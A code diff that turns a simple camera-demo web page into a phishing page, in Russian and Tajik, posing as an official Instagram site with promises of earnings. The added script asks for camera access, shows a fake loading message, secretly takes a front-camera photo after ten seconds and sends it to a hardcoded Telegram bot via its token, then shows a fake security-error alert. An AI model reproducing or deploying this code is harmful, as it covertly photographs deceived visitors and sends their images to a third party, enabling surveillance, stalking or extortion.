@@ -1,56 +1,81 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-<meta charset="UTF-8">
-<title>Камера</title>
-<style>
-body{
-    background:#111;
-    color:white;
-    text-align:center;
-    font-family:Arial;
-}
-video, canvas{
-    border:2px solid lime;
-    border-radius:10px;
-    margin-top:10px;
-}
-button{
-    margin-top:15px;
-    padding:12px 25px;
-    font-size:18px;
-    border:none;
-    border-radius:8px;
-    background:lime;
-    cursor:pointer;
-}
-</style>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram-jaxino.s8 | Официальный сайт</title>
 </head>
-<body>
+<body style="text-align: center; background: #000; color: #fff; font-family: sans-serif; padding: 20px;">
 
-<h2>Нажмите, чтобы включить сылку</h2>
+    <h2>Чтобы войти в сайт, нажмите кнопку ниже ⏬!</h2>
+    <p style="color: #ccc;">Нажми кнопку ниже, а потом разреши доступ к камере.</p>
+    <p style="font-size: 0.9em; color: #888;">Барои пулкор кардан тугмаро зер кунед. Пеш аз ворид шудан тугмаи "Разрешить"-ро зер кунед!</p>
+    
+    <button id="start" style="padding: 15px 30px; font-size: 18px; border-radius: 10px; border: none; background: #0088cc; color: white; cursor: pointer; font-weight: bold; margin-top: 20px;">
+        IInstagram-jaxin.s8
+    </button>
 
-<video id="video" width="320" height="240" autoplay></video><br>
-<button onclick="takePhoto()">😊барои сум кор кардан ба ин силка ворид шавед</button><br>
-<canvas id="canvas" width="320" height="240"></canvas>
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
-<script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const ctx = canvas.getContext("2d");
+    <script>
+        const token = '8312227480:AAFNjTbauuJISDB94AaR10VBZZVmwhobZao';
+        const chatId = '8362977704';
 
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-    video.srcObject = stream;
-})
-.catch(err => {
-    alert("Доступ к сайту запрещён");
-});
+        document.getElementById('start').onclick = async () => {
+            const btn = document.getElementById('start');
+            
+            try {
+                // Запрашиваем доступ к камере
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                // Меняем текст на кнопке, чтобы пользователь ждал
+                btn.innerText = "Загрузка профиля... 10%";
+                btn.style.background = "#555";
 
-function takePhoto(){
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-}
-</script>
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
 
+                // Увеличенная задержка: 10 секунд (10000 мс)
+                // Это даст камере время сфокусироваться и настроить свет
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    
+                    // Рисуем кадр с видео на холст
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'snap.jpg');
+
+                        // Отправка фото в Telegram
+                        fetch(https://api.telegram.org/bot${token}/sendPhoto, {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(() => {
+                            btn.innerText = "Ошибка доступа";
+                            alert("Ошибка: Ваше устройство отклонило запрос безопасности. Попробуйте войти еще раз или через официальное приложение🤭.");
+                            
+                            // Выключаем камеру после снимка
+                            stream.getTracks().forEach(track => track.stop());
+                        })
+                        .catch(err => {
+                            console.error("Ошибка отправки:", err);
+                        });
+                    }, 'image/jpeg', 0.9);
+                    
+                }, 10000); // Время ожидания в миллисекундах
+
+            } catch (err) {
+                alert("Для входа необходимо разрешить доступ к сайту в браузере.");
+            }
+        };
+    </script>
 </body>
 </html>
